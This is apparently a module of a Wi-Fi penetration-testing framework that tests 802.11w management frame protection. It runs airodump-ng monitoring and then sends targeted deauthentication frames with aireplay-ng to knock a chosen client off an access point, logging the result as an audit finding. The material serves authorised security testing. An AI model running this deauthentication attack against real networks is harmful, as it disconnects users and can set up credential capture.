#!/usr/bin/env bash
# MODULE_META
# NAME="Deauthentication Resilience (802.11w)"
# CATEGORY="E"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,airodump-ng"
# DESC="Test if Management Frame Protection (MFP) is actually enforced"
# REQS="monitor_iface,target_bssid,target_channel"
# PCAP="no"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/e3_deauth_resilience.sh
#  E3: Deauth Resilience (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify associated clients on the target AP.
#  2. Use TARGET_CLIENT provided by Go brain.
#  3. Send directed deauthentication frames to the selected client.
#  4. Monitor for disconnection to audit 802.11w (PMF) enforcement.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/e3"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="E3"
TARGET_CLIENT="${TARGET_CLIENT:-}"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. Resilience test requires an associated station."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting deauthentication resilience test for ${C_VAR}${BSSID}${C_RESET}..."
echo -e "[*] Targeting client: ${C_VAR}${TARGET_CLIENT}${C_RESET}"

# 1. Monitoring Phase
CSV_PREFIX="${EVIDENCE_PREFIX}_mon"
LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"

airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
AIRODUMP_PID=$!
sleep 5

# 2. Targeted Deauth Injection
echo -e "[*] Sending surgical deauthentication frames to ${C_VAR}$TARGET_CLIENT${C_RESET}..."
DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true

# 3. Wait & Analyze
sleep 15
kill "$AIRODUMP_PID" || true
wait "$AIRODUMP_PID" 2>/dev/null || true

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Evaluating PMF enforcement..."

FINAL_CSV="${CSV_PREFIX}-01.csv"

echo "[+] Deauth resilience test complete."

if [[ -f "$FINAL_CSV" && -s "$FINAL_CSV" ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "802.11w Enforcement Audit" \
        --severity INFO \
        --desc "Completed active testing of Management Frame Protection (MFP) for ${BSSID}." \
        --target "${BSSID}" \
        --evidence "$FINAL_CSV" \
        --rationale "802.11w (Protected Management Frames) is designed to prevent deauthentication attacks. This audit records the outcome of a targeted deauth attempt."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[E3] Audit Complete" \
        --severity INFO \
        --desc "Active deauthentication resilience test finished on ${BSSID}." \
        --target "${BSSID}" \
        --evidence "$DEAUTH_LOG" \
        --rationale "Management Frame Protection status could not be conclusively determined. No immediate failures were observed."
fi

exit 0
